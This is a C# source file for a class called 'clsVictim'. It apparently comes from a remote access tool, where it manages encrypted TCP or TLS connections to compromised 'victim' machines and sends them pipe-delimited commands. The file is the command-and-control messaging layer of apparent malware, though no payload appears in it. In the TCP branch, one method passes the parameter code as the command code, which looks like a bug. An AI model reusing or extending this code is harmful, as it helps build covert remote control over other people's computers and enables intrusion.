using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.Security;
using Plugin.Abstractions48;

namespace winClient48
{
    public class clsVictim
    {
        public Socket socket { get; set; }
        public SslStream m_sslClnt { get; set; }

        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        public enProtocol m_protocol { get; set; }

        public clsVictim(Socket socket)
        {
            this.socket = socket;

            m_protocol = enProtocol.TCP;
        }

        public clsVictim(Socket sktClnt, SslStream sslClnt)
        {
            socket = sktClnt;
            m_sslClnt = sslClnt;

            m_protocol = enProtocol.TLS;
        }

        public enum enProtocol
        {
            TCP,
            TLS,
            HTTP,
        }

        public void Send(int cmd, int param, byte[] msg)
        {
            if (msg != null)
            {
                byte[] buffer = new clsDSP((byte)cmd, (byte)param, msg).GetBytes();
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {
                        
                    }
                }), buffer);
            }
        }

        public void Send(byte[] abBuffer)
        {
            try
            {
                socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {

                    }
                }), abBuffer);
            }
            catch (Exception ex)
            {

            }
        }

        /// <summary>
        /// Send message string.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="msg">Message string.</param>
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }

        /// <summary>
        /// Send message via encrypted channel.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="data">Data string.</param>
        /// <param name="mode">Message mode.</param>
        public void encSend(int cmd, int param, string data, SendMode mode = SendMode.RAW)
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }

        /// <summary>
        /// Send command string via encrypted channel.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="mode"></param>
        public void SendCommand(string payload)
        {
            switch (m_protocol)
            {
                case enProtocol.TCP:
                    encSend(2, 0, payload);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(Encoding.UTF8.GetBytes(payload));
                    break;
                case enProtocol.HTTP:

                    break;
            }
        }

        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
        public void fnSendCommand(string[] asMsg) => fnSendCommand(asMsg.ToList());
        public void fnSendCommand(List<string> lsMsg)
        {
            SendCommand(string.Join("|", lsMsg));
        }

        public void fnSslSend(string[] asMsg) => fnSslSend(string.Join("|", asMsg));
        public void fnSslSend(List<string> lsMsg) => fnSslSend(string.Join("|", lsMsg));
        public void fnSslSend(string szMsg) => fnSslSendRAW(Encoding.UTF8.GetBytes(szMsg));

        public void fnSslSendRAW(byte[] abBuffer) => fnSslSendRAW(0, 0, abBuffer);
        public void fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
        {
            byte[] abData = new clsDSP((byte)nCmd, (byte)nParam, abBuffer).GetBytes();
            m_sslClnt.BeginWrite(abData, 0, abData.Length, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sslClnt.EndWrite(ar);
                }
                catch (Exception ex)
                {

                }
            }), abData);
        }

        public void fnSendCmdParam(int nCmd, int nParam)
        {
            string szMsg = clsEZData.fnGenerateRandomStr();
            byte[] abData = Encoding.UTF8.GetBytes(szMsg);

            switch (m_protocol)
            {
                case enProtocol.TCP:
                    Send(nParam, nParam, abData);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(nCmd, nParam, abData);
                    break;
            }
        }
    }
}
